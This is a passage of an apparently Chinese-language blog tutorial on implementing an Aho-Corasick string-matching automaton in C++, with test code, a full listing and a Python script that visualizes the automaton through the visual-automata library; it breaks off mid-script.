class="comment">// 从根节点开始找</span></span><br><span class="line">    vector&lt;string&gt; rev;                            <span class="comment">// 所有匹配到的串</span></span><br><span class="line">    string re;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> each: text) &#123; <span class="comment">// 循环每一个字符</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">0</span>) re = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (nodes[p][each - <span class="string">&#x27;a&#x27;</span>] != <span class="number">0</span>) &#123; <span class="comment">// 如果对应字符的边存在,就移动到那个子节点</span></span><br><span class="line">                p = nodes[p][each - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">                re += each;</span><br><span class="line">                <span class="keyword">if</span> ((endNodes[p / bitW] &gt;&gt; (p &amp; (bitW - <span class="number">1</span>))) &amp; <span class="number">1</span>) &#123; <span class="comment">// 如果最后一个节点是单词结束就代表匹配,p&amp;63=p%bitW,(endNodes[p/bitW]&gt;&gt;n)&amp;1是取第n位的数据</span></span><br><span class="line">                    rev.<span class="built_in">push_back</span>(re);</span><br><span class="line">                    p = fail[p] - <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">if</span>(re.<span class="built_in">length</span>() &gt; <span class="number">1</span>)</span><br><span class="line">                        re = re.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (fail[p] == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">                p = fail[p] - <span class="number">1</span>; <span class="comment">// 否则转移(因为fail是从1开始的所以减一)</span></span><br><span class="line">                <span class="keyword">if</span>(re.<span class="built_in">length</span>() &gt; <span class="number">1</span>)</span><br><span class="line">                    re = re.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((endNodes[p / bitW] &gt;&gt; (p &amp; (bitW - <span class="number">1</span>))) &amp; <span class="number">1</span>) &#123; <span class="comment">// 如果节点是匹配结束节点</span></span><br><span class="line">        rev.<span class="built_in">push_back</span>(re);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rev;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-测试代码"><a href="#3-4-测试代码" class="headerlink" title="3.4 测试代码"></a>3.4 测试代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">printVector</span><span class="params">(vector&lt;string&gt; t)</span> </span>&#123;</span><br><span class="line">    string re;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;i: t)</span><br><span class="line">        re += i + <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">trieAdd</span>(<span class="string">&quot;gsafsfawdasca&quot;</span>);</span><br><span class="line">    <span class="built_in">trieAdd</span>(<span class="string">&quot;gdscascwadawxszg&quot;</span>);</span><br><span class="line">    <span class="built_in">trieAdd</span>(<span class="string">&quot;ewyuoascasdwo&quot;</span>);</span><br><span class="line">    <span class="built_in">trieAdd</span>(<span class="string">&quot;csaxawewddwaqw&quot;</span>);</span><br><span class="line">    <span class="built_in">trieFail</span>();</span><br><span class="line">    cout &lt;&lt; <span class="built_in">to_string</span>(now) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">printVector</span>(<span class="built_in">trieFind</span>(<span class="string">&quot;csaxawewddwaqwfsacasfegdscascwadawxszgagsafsfawdascawgrhherasdawdwzz&quot;</span>)) &lt;&lt; endl</span><br><span class="line">         &lt;&lt; <span class="built_in">printVector</span>(<span class="built_in">trieFind</span>(<span class="string">&quot;fsacasfegdscascwadawxszgsafsfawdascawgrhherasdawdwzzcsaxawewddwaqw&quot;</span>)) &lt;&lt; endl</span><br><span class="line">         &lt;&lt; <span class="built_in">printVector</span>(<span class="built_in">trieFind</span>(<span class="string">&quot;cegergecsaxaweqsdawryyrgte&quot;</span>)) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s; i++)</span><br><span class="line">        cout &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> a: fail)</span><br><span class="line">        cout &lt;&lt; a - <span class="number">1</span> &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-5-完整代码"><a href="#3-5-完整代码" class="headerlink" title="3.5 完整代码"></a>3.5 完整代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) Eritque arcus</span></span><br><span class="line"><span class="comment"> * Date: 2022/1/11</span></span><br><span class="line"><span class="comment"> * MIT license</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">int</span> s = <span class="number">50</span>;                                  <span class="comment">// 有多少个节点</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">int</span> bitW = <span class="number">32</span>;                                <span class="comment">// 必须是2的n次方</span></span><br><span class="line"><span class="type">int</span> nodes[s][<span class="number">26</span>]&#123;<span class="number">0</span>&#125;;                                    <span class="comment">// 储存全部的节点</span></span><br><span class="line"><span class="type">int</span> fail[s]&#123;<span class="number">0</span>&#125;;                                         <span class="comment">// 失配跳转</span></span><br><span class="line"><span class="type">int</span> now = <span class="number">1</span>;                                            <span class="comment">// 下一个插入节点的地方</span></span><br><span class="line"><span class="type">int32_t</span> endNodes[s / bitW + (s % bitW &gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>)]&#123;<span class="number">0</span>&#125;; <span class="comment">// 该下标对应的节点是否为单词的结尾</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">trieFail</span><span class="params">()</span> </span>&#123;                                       <span class="comment">// 失配跳转配置</span></span><br><span class="line">    <span class="type">int</span> n;                                              <span class="comment">// now, parent</span></span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; ns;                                      <span class="comment">// 待处理的节点下标</span></span><br><span class="line">    ns.<span class="built_in">push</span>(<span class="number">0</span>);                                         <span class="comment">// 一开始从根目录开始</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ns.<span class="built_in">empty</span>()) <span class="keyword">break</span>; <span class="comment">// 如果没有待处理的就推出</span></span><br><span class="line">        n = ns.<span class="built_in">front</span>();        <span class="comment">// 取出最上面待处理的</span></span><br><span class="line">        ns.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123; <span class="comment">// 循环该节点下全部子节点</span></span><br><span class="line">            <span class="keyword">if</span> (nodes[n][i] != <span class="number">0</span>) &#123;</span><br><span class="line">                &#123;                         <span class="comment">// 求失配跳转位置</span></span><br><span class="line">                    <span class="type">int</span> pp = n;           <span class="comment">// 父节点, 因为遍历的是当前节点的子节点, 所以父节点就是当前节点</span></span><br><span class="line">                    <span class="type">int</span> nn = nodes[n][i]; <span class="comment">// 当前节点, 也就是遍历的子节点</span></span><br><span class="line">                    <span class="keyword">if</span> (pp == <span class="number">0</span>) &#123;        <span class="comment">// 如果父节点是根节点, 那失配节点就是根节点</span></span><br><span class="line">                        fail[nn] = <span class="number">1</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span></span><br><span class="line">                        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;                            <span class="comment">// 不断循环父节点的失配位置, 或者父节点的失配位置的失配位置直到在根节点寻找失配位置或者找到合适的</span></span><br><span class="line">                            <span class="keyword">if</span> (fail[pp] != <span class="number">0</span>) pp = fail[pp] - <span class="number">1</span>; <span class="comment">// 如果父节点有失配位置, 就移动过去</span></span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                <span class="keyword">throw</span> <span class="built_in">invalid_argument</span>(<span class="built_in">to_string</span>(nn) + <span class="string">&quot;-&quot;</span> + <span class="built_in">to_string</span>(pp) + <span class="string">&quot;x&quot;</span>); <span class="comment">// unreachable</span></span><br><span class="line">                            <span class="keyword">if</span> (nodes[pp][i] != <span class="number">0</span>) &#123;                                               <span class="comment">// 如果该节点(父节点的某个失配位置)有i的边就移动过去</span></span><br><span class="line">                                fail[nn] = nodes[pp][i] + <span class="number">1</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (pp == <span class="number">0</span>) &#123; <span class="comment">// 如果父节点是根节点, 那失配节点就直接是根节点</span></span><br><span class="line">                                fail[nn] = <span class="number">1</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ns.<span class="built_in">push</span>(nodes[n][i]); <span class="comment">// 把该子节点列入待处理栈</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">trieAdd</span><span class="params">(<span class="type">const</span> std::string &amp;text)</span> </span>&#123;   <span class="comment">// 插入单词</span></span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;                            <span class="comment">// 当前插入到哪个节点, 一开始从根节点开始</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> each: text) &#123;               <span class="comment">// 循环每个字符</span></span><br><span class="line">        <span class="keyword">if</span> (nodes[p][each - <span class="string">&#x27;a&#x27;</span>] == <span class="number">0</span>)    <span class="comment">// 如果没有对应的字符节点就新建一个</span></span><br><span class="line">            nodes[p][each - <span class="string">&#x27;a&#x27;</span>] = now++; <span class="comment">// 存入对应字符节点的下标</span></span><br><span class="line">        p = nodes[p][each - <span class="string">&#x27;a&#x27;</span>];         <span class="comment">// 把目前插入到的节点指向到对应字符的子节点</span></span><br><span class="line">    &#125;</span><br><span class="line">    endNodes[p / bitW] = endNodes[p / bitW] ^ (<span class="number">1</span> &lt;&lt; (p &amp; (bitW - <span class="number">1</span>))); <span class="comment">// 表明该节点是单词的结尾, endNodes[p/bitW]^(1&lt;&lt;n)是对n位取反, 后面的p&amp;63为:当取余的除数为2^n时,可以用p&amp;(k-1)代替,也就是p&amp;63</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">vector&lt;string&gt; <span class="title">trieFind</span><span class="params">(<span class="type">const</span> std::string &amp;text)</span> </span>&#123; <span class="comment">// 查找一个单词</span></span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;                                     <span class="comment">// 从根节点开始找</span></span><br><span class="line">    vector&lt;string&gt; rev;                            <span class="comment">// 所有匹配到的串</span></span><br><span class="line">    string re;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> each: text) &#123; <span class="comment">// 循环每一个字符</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">0</span>) re = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (nodes[p][each - <span class="string">&#x27;a&#x27;</span>] != <span class="number">0</span>) &#123; <span class="comment">// 如果对应字符的边存在,就移动到那个子节点</span></span><br><span class="line">                p = nodes[p][each - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">                re += each;</span><br><span class="line">                <span class="keyword">if</span> ((endNodes[p / bitW] &gt;&gt; (p &amp; (bitW - <span class="number">1</span>))) &amp; <span class="number">1</span>) &#123; <span class="comment">// 如果最后一个节点是单词结束就代表匹配,p&amp;63=p%bitW,(endNodes[p/bitW]&gt;&gt;n)&amp;1是取第n位的数据</span></span><br><span class="line">                    rev.<span class="built_in">push_back</span>(re);</span><br><span class="line">                    p = fail[p] - <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">if</span>(re.<span class="built_in">length</span>() &gt; <span class="number">1</span>)</span><br><span class="line">                        re = re.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (fail[p] == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">                p = fail[p] - <span class="number">1</span>; <span class="comment">// 否则转移(因为fail是从1开始的所以减一)</span></span><br><span class="line">                <span class="keyword">if</span>(re.<span class="built_in">length</span>() &gt; <span class="number">1</span>)</span><br><span class="line">                    re = re.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((endNodes[p / bitW] &gt;&gt; (p &amp; (bitW - <span class="number">1</span>))) &amp; <span class="number">1</span>) &#123; <span class="comment">// 如果节点是匹配结束节点</span></span><br><span class="line">        rev.<span class="built_in">push_back</span>(re);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rev;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">printVector</span><span class="params">(vector&lt;string&gt; t)</span> </span>&#123;</span><br><span class="line">    string re;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;i: t)</span><br><span class="line">        re += i + <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">trieAdd</span>(<span class="string">&quot;aaaaaa&quot;</span>);</span><br><span class="line">    <span class="built_in">trieAdd</span>(<span class="string">&quot;bbbbbb&quot;</span>);</span><br><span class="line">    <span class="built_in">trieAdd</span>(<span class="string">&quot;ababab&quot;</span>);</span><br><span class="line">    <span class="built_in">trieAdd</span>(<span class="string">&quot;cacsafasfasfsgefacsdcewg&quot;</span>);</span><br><span class="line">    <span class="built_in">trieFail</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;节点数:&quot;</span> + <span class="built_in">to_string</span>(now) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">printVector</span>(<span class="built_in">trieFind</span>(<span class="string">&quot;aaaaaaabbbbbbbbbacacsafasfasfsgefacsdcewgbaabcaaaaaaabbbbbbbbbbbbabbbbbbbbbbbbaav&quot;</span>)) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s; i++)</span><br><span class="line">        cout &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> a: fail)</span><br><span class="line">        cout &lt;&lt; a - <span class="number">1</span> &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-可视化扩展"><a href="#4-可视化扩展" class="headerlink" title="4. 可视化扩展"></a>4. 可视化扩展</h2><p>可以通过python的<a href="https://pypi.org/project/visual-automata/">visual-automata</a>来画</p><h3 id="4-1-cpp-更改"><a href="#4-1-cpp-更改" class="headerlink" title="4.1 cpp 更改"></a>4.1 cpp 更改</h3><p>这部分就不考虑优化了(<br>先声明一个<code>vector&lt;int&gt; final;</code>储存最终节点<br>然后在triedAdd方法push_back</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">trieAdd</span><span class="params">(<span class="type">const</span> std::string &amp;text)</span> </span>&#123;   <span class="comment">// 插入单词</span></span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;                            <span class="comment">// 当前插入到哪个节点, 一开始从根节点开始</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> each: text) &#123;               <span class="comment">// 循环每个字符</span></span><br><span class="line">        <span class="keyword">if</span> (nodes[p][each - <span class="string">&#x27;a&#x27;</span>] == <span class="number">0</span>)    <span class="comment">// 如果没有对应的字符节点就新建一个</span></span><br><span class="line">            nodes[p][each - <span class="string">&#x27;a&#x27;</span>] = now++; <span class="comment">// 存入对应字符节点的下标</span></span><br><span class="line">        p = nodes[p][each - <span class="string">&#x27;a&#x27;</span>];         <span class="comment">// 把目前插入到的节点指向到对应字符的子节点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span>.<span class="built_in">push_back</span>(p);</span><br><span class="line">    endNodes[p / bitW] = endNodes[p / bitW] ^ (<span class="number">1</span> &lt;&lt; (p &amp; (bitW - <span class="number">1</span>))); <span class="comment">// 表明该节点是单词的结尾, endNodes[p/bitW]^(1&lt;&lt;n)是对n位取反, 后面的p&amp;63为:当取余的除数为2^n时,可以用p&amp;(k-1)代替,也就是p&amp;63</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要在main方法调用后</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nlohmann::json j;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; now;i++)</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> a = <span class="number">0</span>; a &lt; <span class="number">26</span>; a ++)</span><br><span class="line">           j[<span class="number">0</span>][i][a] = nodes[i][a];</span><br><span class="line">   j[<span class="number">1</span>] = fail;</span><br><span class="line">   j[<span class="number">2</span>] = <span class="keyword">final</span>;</span><br><span class="line">   cout&lt;&lt;endl&lt;&lt;j.<span class="built_in">dump</span>();</span><br></pre></td></tr></table></figure><p>就可以拿到json格式的转换表</p><h3 id="4-2-python"><a href="#4-2-python" class="headerlink" title="4.2 python"></a>4.2 python</h3><p>先根据<a href="https://pypi.org/project/visual-automata/#prerequisites">pypi</a>里的安装依赖, 然后把上面的json数据复制到下面代码里的<code>jsonData</code>然后运行就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># author: Eritque arcus</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> visual_automata.fa.nfa <span class="keyword">import</span> VisualNFA</span><br><span class="line"></span><br><span class="line">jsonData = <span class="string">&quot;[[[1,7,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[2,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,0,0,0,0,0,0,0],[22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,0,0,0,0,0,0,0],[0,0,0,0,0,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[27,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,28,0,0,0,0,0,0,0],[0,0,0,0,0,29,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,0,0,0,0,0,0,0],[0,0,0,0,0,0,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,0,0,0,0,0,0,0],[0,0,0,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,0,0,0],[0,0,0,0,0,0,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]],[0,1,2,3,4,5,6,1,8,9,10,11,12,8,2,14,15,16,1,2,19,1,2,1,2,1,1,2,1,1,1,1,1,1,2,19,1,1,19,1,1,1,0,0,0,0,0,0,0,0],[6,12,17,41]]&quot;</span></span><br><span class="line">a = json.loads(jsonData)</span><br><span class="line">t = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a[<span class="number">0</span>])):</span><br><span class="line">    it = &#123;&#125;  <span class="comment"># inside transition</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a[<span class="number">0</span>][j])):</span><br><span class="line">        <span class="keyword">if</span> a[<span class="number">0</span>][j][i] != <span class="number">0</span>:</span><br><span class="line">            it[<span class="built_in">chr</span>(i + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))] = &#123;<span class="string">&quot;q&quot;</span> + <span class="built_in">str</span>(a[<span class="number">0</span>][j][i])&#125;</span><br><span class="line">            <span class="keyword">if</span> a[<span class="number">1</span>][j] &gt; <span class="number">0</span>:</span><br><span class="line">                it[<span class="string">&quot;fail&quot;</span>] = &#123;<span class="string">&quot;q&quot;</span> + <span class="built_in">str</span>(a[<span class="number">1</span>][j] - <span class="number">1</span>)&#125;</span><br><span class="line">    t[<span class="string">&quot;q&quot;</span> + <span class="built_in">str</span>(j)] = it</span><br><span class="line">inputS = <span class="built_in">set</span>([<span class="built_in">chr</span>(b + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)])</span><br><span class="line">inputS.add(<span class="string">&quot;fail&quot;</span>)</span><br><span class="line">nfa = VisualNFA(</span><br><span class="line">    states=<span class="built_in">set</span>([<span class="string">&quot;q&quot;</span> + <span class="built_in">str</span>(b) <span 